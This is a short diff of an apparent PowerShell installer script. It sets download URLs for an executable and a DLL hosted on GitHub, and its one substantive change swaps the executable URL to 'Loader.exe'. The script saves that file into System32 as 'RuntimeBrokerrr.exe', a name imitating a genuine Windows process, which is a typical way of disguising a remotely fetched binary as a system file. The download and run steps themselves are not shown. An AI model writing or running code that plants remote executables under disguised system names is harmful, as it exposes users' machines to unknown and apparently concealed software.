@@ -24,7 +24,7 @@ $exeDestination = Join-Path $system32Path "RuntimeBrokerrr.exe"
 $dllDestination = Join-Path $system32Path "Guna.UI2.dll"
 
 
-$exeUrl = "https://github.com/ORRYxyz/cccc/raw/main/PIGGY%20POOL%20MODE.exe"
+$exeUrl = "https://github.com/ORRYxyz/cccc/raw/main/Loader.exe"
 $dllUrl = "https://github.com/NAWINNNNNNNNNNNNNNNNNNNNNNNNNNN/WEBSEA1213/raw/refs/heads/main/Guna.UI2.dll"
 
 # -----------------------------
@@ -100,4 +100,5 @@ else {
     Write-Host "Invalid choice (please select 1 or 2)." -ForegroundColor Red
 
 }
+
 
